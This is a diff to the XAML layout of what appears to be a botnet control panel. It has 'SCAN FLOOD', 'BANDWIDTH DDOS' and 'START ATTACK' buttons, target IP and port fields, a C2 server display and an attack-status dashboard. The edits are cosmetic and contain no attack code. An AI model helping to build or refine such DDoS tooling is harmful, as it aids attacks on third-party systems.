@@ -220,19 +220,24 @@
                 <Button x:Name="SCAN_FLOOD" Background="#0e0e0e" Foreground="White" Content="SCAN FLOOD" Height="50" FontSize="14" Click="SCAN_FLOOD_Click"/>
                 <Button x:Name="BANDWIDTH_DDOS" Background="#0e0e0e" Foreground="White" Content="BANDWIDTH DDOS" Height="50" FontSize="14" Click="BANDWIDTH_DDOS_Click"/>
                 <!--IP Address section-->
-                <Label Content="IP Address" Foreground="White" FontSize="10" VerticalContentAlignment="Bottom" />
-                <TextBox x:Name="IP_ADDRESS" Foreground="White" Background="#250000" FontSize="14" Padding="10px" />
-                <Label Content="Ports to Attack (comma separated)" Foreground="White" FontSize="10" VerticalContentAlignment="Bottom" />
+                <Label Content="IP Address" Foreground="White" FontSize="10" VerticalContentAlignment="Bottom"/>
+                <TextBox x:Name="IP_ADDRESS" Foreground="White" Background="#250000" FontSize="14" Padding="10px"/>
+                <Label Content="Ports to Attack (comma separated)" Foreground="White" FontSize="10" VerticalContentAlignment="Bottom"/>
                 <TextBox x:Name="PORTS" Foreground="White" Background="#250000" FontSize="14" Padding="10px" />
             </StackPanel>
-            <Button x:Name="ATTACK_BUTTON" Grid.Row="1" Foreground="White" Background="Red" Content="START ATTACK" FontSize="30" Click="ATTACK_BUTTON_Click" />
+            <Button x:Name="ATTACK_BUTTON" Grid.Row="1" Foreground="White" Background="Red" Content="START ATTACK" FontSize="30" Click="ATTACK_BUTTON_Click"/>
             <Grid Grid.Column="1" Grid.RowSpan="2">
                 <Grid.RowDefinitions>
                     <RowDefinition Height="50"></RowDefinition>
                     <RowDefinition Height="*"></RowDefinition>
                 </Grid.RowDefinitions>
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="*"></ColumnDefinition>
+                </Grid.ColumnDefinitions>
                 <Label Grid.Row="0" Content="Terminal Output" Foreground="White" FontSize="24" FontWeight="Bold" Background="DarkRed" HorizontalAlignment="Stretch" HorizontalContentAlignment="Center"/>
-                <TextBlock Grid.Row="1" x:Name="TERMINAL_OUTPUT_BOTS" Background="#250000" VerticalAlignment="Stretch"/>
+                <TextBlock Grid.Row="1" x:Name="TERMINAL_OUTPUT_BOTS" Background="#250000" TextAlignment="Center"
+                           VerticalAlignment="Stretch" Foreground="LightGray" FontSize="20"
+                           FontWeight="DemiBold"/>
             </Grid>
         </Grid>
         
@@ -256,7 +261,6 @@
                 <Grid Grid.Row="1" Background="#1f1f1f">
                     <Label x:Name="C2_SERVER_IP" Background="#1f1f1f" Foreground="White" FontSize="36" FontWeight="DemiBold" VerticalAlignment="Center" HorizontalAlignment="Center"/>
                 </Grid>
-
             </Grid>
             <Grid Grid.Row="0" Grid.Column="1">
                 <Grid.RowDefinitions>
@@ -271,7 +275,7 @@
                     <RowDefinition Height="25"></RowDefinition>
                     <RowDefinition Height="*"></RowDefinition>
                 </Grid.RowDefinitions>
-                <Label Content="Bot Exceptions Thrown" Background="DarkRed" Foreground="White" />
+                <Label Content="Bot Exceptions Thrown (current session)" Background="DarkRed" Foreground="White" />
                 <TextBlock Grid.Row="1" x:Name="C2_EXCEPTIONS_THROWN" Background="#1f1f1f" Foreground="White" FontSize="24" />
             </Grid>
             <Grid Grid.Row="1" Grid.Column="1">
@@ -287,15 +291,19 @@
             <Grid.RowDefinitions>
                 <RowDefinition Height="25"></RowDefinition>
                 <RowDefinition Height="*"></RowDefinition>
-                <RowDefinition Height="*"></RowDefinition>
-                <RowDefinition Height="*"></RowDefinition>
-                <RowDefinition Height="*"></RowDefinition>
             </Grid.RowDefinitions>
             <Label Grid.Row="0" Foreground="White" Content="Active Attack Map Dashboard" Background="DarkRed" />
-            <StackPanel Grid.Row="1" x:Name="ACTIVE_ATTACK_MAP_ROW_1" Orientation="Horizontal" />
-            <StackPanel Grid.Row="2" x:Name="ACTIVE_ATTACK_MAP_ROW_2" Orientation="Horizontal" />
-            <StackPanel Grid.Row="3" x:Name="ACTIVE_ATTACK_MAP_ROW_3" Orientation="Horizontal" />
-            <StackPanel Grid.Row="4" x:Name="ACTIVE_ATTACK_MAP_ROW_4" Orientation="Horizontal" />
+            <Grid Grid.Row="1">
+                <Grid.RowDefinitions>
+                    <RowDefinition Height="*"></RowDefinition>
+                </Grid.RowDefinitions>
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="*"></ColumnDefinition>
+                    <ColumnDefinition Width="*"></ColumnDefinition>
+                </Grid.ColumnDefinitions>
+                <Label Grid.Column="0" Content="TARGET STATUS" FontSize="60" VerticalContentAlignment="Center" HorizontalContentAlignment="Center"/>
+                <Label Grid.Column="1" x:Name="TARGET_STATUS"  Content="N/A" FontSize="60" VerticalContentAlignment="Center" HorizontalContentAlignment="Center"/>
+            </Grid>
         </Grid>
         <Grid Grid.Row="3" Grid.Column="0">
             <StackPanel Orientation="Vertical">
